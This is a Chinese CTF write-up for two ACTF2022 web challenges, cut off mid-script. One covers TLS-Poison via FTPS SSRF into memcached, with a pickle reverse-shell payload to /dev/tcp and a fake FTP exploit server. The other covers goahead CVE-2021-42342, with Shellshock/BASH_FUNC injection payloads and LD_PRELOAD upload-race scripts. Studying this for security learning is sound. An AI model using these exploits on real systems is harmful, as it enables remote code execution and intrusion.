<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>ACTF2022-WriteUp - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="ACTF2022-WriteUp - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/04/02/ACTF2022%20_%20Web/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-04-02T14:40:12.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>April</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">ACTF2022-WriteUp</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="ToLeSion"><a href="#ToLeSion" class="headerlink" title="ToLeSion"></a>ToLeSion</h1><p>考点：TLS Posion攻击，FTP被动SSRF，pymemcached的pickled反序列化<br>可以说是buff叠满了这一题XD<br>然后题解过程也是尼玛及其复杂<br>这里我就是不想复现了，就来说一下思路：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> memcache</span><br><span class="line"><span class="keyword">import</span> pycurl</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line">app.secret_key = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_uppercase + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">56</span>))</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_TYPE&#x27;</span>] = <span class="string">&#x27;memcached&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_PERMANENT&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_USE_SIGNER&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_KEY_PREFIX&#x27;</span>] = <span class="string">&#x27;actfSession:&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_MEMCACHED&#x27;</span>] = memcache.Client([<span class="string">&#x27;127.0.0.1:11200&#x27;</span>])</span><br><span class="line"></span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    buffer=BytesIO()</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;url&#x27;</span>):</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        c = pycurl.Curl()</span><br><span class="line">        c.setopt(c.URL, url)</span><br><span class="line">        c.setopt(c.FTP_SKIP_PASV_IP, <span class="number">0</span>)</span><br><span class="line">        c.setopt(c.WRITEDATA, buffer)</span><br><span class="line">        blacklist = [c.PROTO_DICT, c.PROTO_FILE, c.PROTO_FTP, c.PROTO_GOPHER, c.PROTO_HTTPS, c.PROTO_IMAP, c.PROTO_IMAPS, c.PROTO_LDAP, c.PROTO_LDAPS, c.PROTO_POP3, c.PROTO_POP3S, c.PROTO_RTMP, c.PROTO_RTSP, c.PROTO_SCP, c.PROTO_SFTP, c.PROTO_SMB, c.PROTO_SMBS, c.PROTO_SMTP, c.PROTO_SMTPS, c.PROTO_TELNET, c.PROTO_TFTP]</span><br><span class="line">        allowProtos = c.PROTO_ALL</span><br><span class="line">        <span class="keyword">for</span> proto <span class="keyword">in</span> blacklist:</span><br><span class="line">            allowProtos = allowProtos&amp;~(proto)</span><br><span class="line">        c.setopt(c.PROTOCOLS, allowProtos)</span><br><span class="line">        c.perform()</span><br><span class="line">        c.close()</span><br><span class="line">        <span class="keyword">return</span> buffer.getvalue().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;?url=http://www.baidu.com&#x27;</span>,code=<span class="number">301</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>一眼丁真就是SSRF，起了个memcached缓存，这个我们在之前的文章见到过，因此很清楚，然后ban掉了几个协议留下来的只有HTTP,FTP等等，那这里我们需要利用的也就是FTP协议进行SSRF攻击，进而RCE了</p>
<ul>
<li>标题的ToLeSion，大写字母TLS。</li>
<li>memcached——经典TLS-Poison受害者。</li>
<li>pycurl几乎禁用了所有的协议唯独没有禁用FTPS。</li>
<li>设置FTP_SKIP_PASV_IP为0。ftp-skip-pasv-ip设置了curl不要使用被动模式下服务器提供的ip和端口，这个设置在curl 7.74.0版本之后默认是开启的，这里显式设置为0也是一个很强的暗示。</li>
</ul>
<p>很明显，我们需要使用ftps打TLS-Poison，ssrf写memcached。<br>以下参考葵师傅的文章：<a target="_blank" rel="noopener" href="https://amiaaaz.github.io/2022/07/07/actf2022-wp/#tolesion">https://amiaaaz.github.io/2022/07/07/actf2022-wp/#tolesion</a>（我太懒了对不起）<br><strong>先简单了解一下 TLS Poison：</strong><br>根据我们对 TLS 连接过程的了解，不论在 TLS 1.2 或是 1.3 中都会使用类似 cookie 的 32 位 sessionID 来验证客户端的身份，这个凭据由服务端下发至客户端，服务端不保存，当客户端 HTTPS 访问站点时服务端会对其进行解密；此时如果我们有一个恶意的服务器，向客户端分发特制的凭据，客户端就会把这个凭据存储起来<br>在实际进行 HTTPS 请求之前，客户端需要对域名进行 DNS 查询，如果 DNS 缓存过期则会再进行一次 DNS 查询，如果没有过期，很容易联想到 DNS 重绑定<br>第一次请求时返回指向我们恶意服务器的 IP，使第一次 TLS 握手成功 客户端缓存恶意的凭据，在第二次请求需要恢复会话时发起第二次 DNS 请求，此时返回重绑定的结果 127.0.0.1，当客户端恢复会话时客户端会用我们恶意服务器下发的凭据与 127.0.0.1 尝试 TLS 握手，也就是说对内网地址进行一次请求<br>有一张很直观的图可以辅助理解<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678191188809-124c7e09-711c-418c-b319-1a245942f366.png#averageHue=%23f9f8f8&clientId=u7e1e3703-b617-4&from=paste&height=560&id=ub6f82dee&name=image.png&originHeight=700&originWidth=1302&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=51606&status=done&style=none&taskId=uac046ee5-c962-4adb-9c2d-faa3fe45425&title=&width=1041.6" alt="image.png"></p>
<p>简单来说，当客户端使用ftps:&#x2F;&#x2F;ip:port&#x2F;访问ftp服务器，ftp服务器在被动模式下向客户端指定数据传输的ip和端口，客户端连接服务器该ip和端口时会重用第一次连接的相关信息，这里就导致了ssrf。<br>针对TLS-Poison的利用，这里推荐一下这个github仓库：<br><a target="_blank" rel="noopener" href="https://github.com/jmdx/TLS-Poison%E3%80%82">https://github.com/jmdx/TLS-Poison。</a><br>我们可以用它来实现TLS层的解析，通过下面的命令监听8000端口并将tls解析之后应用层的内容转发给1234端口：<br><code>target/debug/custom-tls -p 8000 --verbose --certs /etc/letsencrypt/live/&lt;your_domain&gt;/fullchain.pem --key /etc/letsencrypt/live/&lt;your_domain&gt;/privkey.pem  forward 1234</code><br>使用redis设置payload：<br><code>set payload &quot;\r\nset actfSession:whatever 0 0 &lt;len&gt;\n(S&#39;/bin/bash -c \&quot;/bin/bash -i &gt;&amp; /dev/tcp/&lt;your_domain&gt;/8080 0&gt;&amp;1\&quot;&#39;\nios\nsystem\n.\r\n&quot; </code><br>经过8000端口的解析，转发到1234端口的内容就是普通的ftp请求了。在1234端口开启一个被动模式返回ip和端口是ssrf目标的ftp服务即可，针对本题就是127.0.0.1的11200端口：<br><code>python3 FTPserverForTLSpoison.py 1234 127.0.0.1 11200 </code><br>控制目标机访问ftps:&#x2F;&#x2F;<your_domain>:8000&#x2F;，即可触发上述TLS-Poison流程，向memcached写入序列化字符串。<br>最后监听8080端口，使用上述写入的session访问网站即可触发反序列化getshell。<br>这里附赠题解EXP：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socketserver, threading,sys</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Usage: python3 exp.py local_port target_ip target_port</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">lport = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">raddr = sys.argv[<span class="number">2</span>].replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">rport = <span class="built_in">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">t1=<span class="built_in">int</span>(rport/<span class="number">256</span>)</span><br><span class="line">t2=rport%<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyTCPHandler</span>(socketserver.StreamRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] connected&#x27;</span>, self.request, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;220 (vsFTPd 3.0.3)\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(self.data, file=sys.stderr,flush=<span class="literal">True</span>)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;230 Login successful.\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;200 yolo\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;200 yolo\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;257 &quot;/&quot; is the current directory\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">f&#x27;227 Entering Passive Mode (<span class="subst">&#123;raddr&#125;</span>,<span class="subst">&#123;t1&#125;</span>,<span class="subst">&#123;t2&#125;</span>)\r\n&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">f&#x27;227 Entering Passive Mode (<span class="subst">&#123;raddr&#125;</span>,<span class="subst">&#123;t1&#125;</span>,<span class="subst">&#123;t2&#125;</span>)\r\n&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;200 Switching to Binary mode.\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;125 Data connection already open. Transfer starting.\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(self.data, file=sys.stderr)</span><br><span class="line">        <span class="comment"># 226 Transfer complete.</span></span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;250 Requested file action okay, completed.&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ftp_worker</span>():</span><br><span class="line">    <span class="keyword">with</span> socketserver.TCPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, lport), MyTCPHandler) <span class="keyword">as</span> server:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            server.handle_request()</span><br><span class="line">threading.Thread(target=ftp_worker).start()</span><br></pre></td></tr></table></figure>
<p>有关证书的获取参考：<br><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/2021/04/20/tls-poison/">https://blog.zeddyu.info/2021/04/20/tls-poison/</a><br>陆队的文章里直接搜索证书就好了，这文章牛魔3w字起步<br>然后找个时间打算把FTP进行SSRF的点写一篇文章总结一下，这个星期之内把文章憋出来</p>
<h1 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h1><p>考点：goahead CVE-2021-42342、环境变量注入<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html">https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html</a><br>看p文，是一种享受，在这里涉及到了一个goahead的漏洞，在这漏洞中我们可以进行任意的环境变量注入，但前提是发包为POST的multiple类型的数据包，其实早在2017年goahead也有过环境变量注入<br>之前在写PHP的时候也解出过一些环境变量注入，具体可以参考:<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a><br>所以，之后我们遇到环境变量注入，可以进行下列三种测试：</p>
<ul>
<li>Bash没有修复ShellShock漏洞：直接使用ShellShock的POC进行测试，例如TEST&#x3D;() { :; }; id;</li>
<li>Bash 4.4以前：env $’BASH_FUNC_echo()&#x3D;() { id; }’ bash -c “echo hello”</li>
<li>Bash 4.4及以上：env $’BASH_FUNC_echo%%&#x3D;() { id; }’ bash -c ‘echo hello’</li>
</ul>
<p>在CentOS系系统下完美解决本文开头提到的问题，通杀所有Bash。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;BASH_FUNC_env%%&quot;</span>:(<span class="literal">None</span>,<span class="string">&quot;() &#123; cat /flag; exit; &#125;&quot;</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&quot;http://127.0.0.1:7788/cgi-bin/hello&quot;</span>,files=payload)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<p>方式二，就是通过上传so文件，然后劫持包含LD_PRELOAD选项，最后触发反弹shellRCE：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, random</span><br><span class="line"><span class="keyword">from</span> concurrent <span class="keyword">import</span> futures</span><br><span class="line"><span class="keyword">from</span> requests_toolbelt <span class="keyword">import</span> MultipartEncoder</span><br><span class="line">hack_so = <span class="built_in">open</span>(<span class="string">&#x27;hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">url</span>):</span><br><span class="line">    m = MultipartEncoder(</span><br><span class="line">        fields = &#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.txt&#x27;</span>, hack_so,<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    r = requests.post(</span><br><span class="line">        url = url,</span><br><span class="line">        data=m,</span><br><span class="line">        headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: m.content_type&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">include</span>(<span class="params">url</span>):</span><br><span class="line">    m = MultipartEncoder(</span><br><span class="line">        fields = &#123;</span><br><span class="line">            <span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;/proc/self/fd/7&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    r = requests.post(</span><br><span class="line">        url = url,</span><br><span class="line">        data=m,</span><br><span class="line">        headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: m.content_type&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">race</span>(<span class="params">method</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://localhost:10218/cgi-bin/hello&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> method == <span class="string">&#x27;include&#x27;</span>:</span><br><span class="line">        include(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        upload(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    task = [<span class="string">&#x27;upload&#x27;</span>,<span class="string">&#x27;include&#x27;</span>] * <span class="number">1000</span></span><br><span class="line">    random.shuffle(task) <span class="comment"># </span></span><br><span class="line">    <span class="keyword">with</span> futures.ThreadPoolExecutor(max_workers=<span class="number">5</span>) <span class="keyword">as</span> executor:</span><br><span class="line">        results = <span class="built_in">list</span>(executor.<span class="built_in">map</span>(race, task))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>或者：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, ParseResult</span><br><span class="line"></span><br><span class="line">PAYLOAD_MAX_LENGTH = <span class="number">16384</span> - <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">client, parts: ParseResult, payload: <span class="built_in">bytes</span></span>):</span><br><span class="line">    path = <span class="string">&#x27;/&#x27;</span> <span class="keyword">if</span> <span class="keyword">not</span> parts.path <span class="keyword">else</span> parts.path</span><br><span class="line">    boundary = <span class="string">&#x27;----%s&#x27;</span> % <span class="built_in">str</span>(random.randint(<span class="number">1000000000000</span>, <span class="number">9999999999999</span>))</span><br><span class="line">    padding = <span class="string">&#x27;a&#x27;</span> * <span class="number">2000</span></span><br><span class="line">    content_length = <span class="built_in">min</span>(<span class="built_in">len</span>(payload) + <span class="number">500</span>, PAYLOAD_MAX_LENGTH)</span><br><span class="line">    data = <span class="string">fr&#x27;&#x27;&#x27;POST <span class="subst">&#123;path&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: <span class="subst">&#123;parts.hostname&#125;</span></span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept: */*</span></span><br><span class="line"><span class="string">Accept-Language: en</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=<span class="subst">&#123;boundary&#125;</span></span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;content_length&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--<span class="subst">&#123;boundary&#125;</span></span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;LD_PRELOAD&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/proc/self/fd/7</span></span><br><span class="line"><span class="string">--<span class="subst">&#123;boundary&#125;</span></span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;data&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#payload#<span class="subst">&#123;padding&#125;</span></span></span><br><span class="line"><span class="string">--<span class="subst">&#123;boundary&#125;</span>--</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">    data = data.encode().replace(<span class="string">b&#x27;#payload#&#x27;</span>, payload)</span><br><span class="line">    client.send(data)</span><br><span class="line">    resp = client.recv(<span class="number">20480</span>)</span><br><span class="line">    <span class="built_in">print</span>(resp.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    target = 